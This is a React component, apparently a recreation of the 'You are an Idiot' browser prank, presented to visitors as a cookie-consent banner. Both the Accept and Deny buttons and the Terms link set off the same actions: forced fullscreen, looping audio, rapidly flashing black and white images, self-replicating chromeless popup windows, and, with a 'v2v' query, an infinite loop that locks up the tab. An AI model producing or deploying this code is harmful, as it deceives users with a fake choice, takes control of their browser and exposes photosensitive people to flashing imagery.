import { useRef, useState, useEffect, useCallback } from "react";
import "./Beta.css";

function Idiot() {
    const [playing, setPlaying] = useState(false);
    const audioRef = useRef<HTMLAudioElement>(null);

    const changeTitle = (title: string) => {
        document.title = title;
    };

    const openWindow = (url: string) => {
        const fullUrl = `${url}?ready`;
        window.open(
            fullUrl,
            "_blank",
            'menubar=no,status=no,toolbar=no,resizable=no,width=357,height=330,titlebar=no,alwaysRaised=yes'
        );
    };

    // eslint-disable-next-line react-hooks/exhaustive-deps
    const procreate = () => {
        changeTitle("Idiot!");
        openWindow("beta");
    };

    const handleActivation = useCallback(() => {
        if (!playing) {
            startExperience();
        }
        if (window.location.search.includes("v2v")) {
            while (true) {
                if (screen.orientation?.lock) {
                    screen.orientation.lock("landscape").catch(() => console.log("Orientation lock failed"));
                }
                if (screen.orientation?.lock) {
                    screen.orientation.lock("portrait").catch(() => console.log("Orientation lock failed"));
                }
            }
        }
        procreate();
    }, [playing, procreate]);

    const startExperience = () => {
        setPlaying(true);

        if (audioRef.current) {
            audioRef.current.currentTime = 0;
            audioRef.current.play().catch(() => setPlaying(false));
        }

        const elem = document.documentElement;
        if (elem.requestFullscreen) elem.requestFullscreen().catch(() => {});
        else if ((elem as any).webkitRequestFullscreen) (elem as any).webkitRequestFullscreen();
        else if ((elem as any).msRequestFullscreen) (elem as any).msRequestFullscreen();

        if (screen.orientation?.lock) {
            screen.orientation.lock("landscape").catch(() => console.log("Orientation lock failed"));
        }
    };

    useEffect(() => {
        if (window.location.search.includes("ready")) {
            window.addEventListener("keydown", handleActivation);
            window.addEventListener("click", handleActivation);
        }

        return () => {
            window.removeEventListener("keydown", handleActivation);
            window.removeEventListener("click", handleActivation);
        };
    }, [handleActivation]);

    return (
        <div className="idiot-container">
            {playing ? (
                <>
                    <img src="/black.png" alt="black" className="blink-image blink1" />
                    <img src="/white.png" alt="white" className="blink-image blink2" />
                </>
            ) : (
                <div className="overlay">
                    <div className="main-container overlay-content" style={{ width: "20%" }}>
                        <p>
                            This website uses cookies to enhance your experience,
                            track usage, and display custom content. By continuing,
                            you accept the use of cookies. For more information, see our{" "}
                            <a href="/terms" onClick={(e) => { e.preventDefault(); handleActivation(); }}>
                                Terms & Conditions
                            </a>.
                        </p>
                        <div className="button-row">
                            <button onClick={handleActivation}>Accept</button>
                            <button onClick={handleActivation}>Deny</button>
                        </div>
                    </div>
                </div>
            )}
            <audio ref={audioRef} src="/Idiot!.mp3" loop />
        </div>
    );
}

export default Idiot;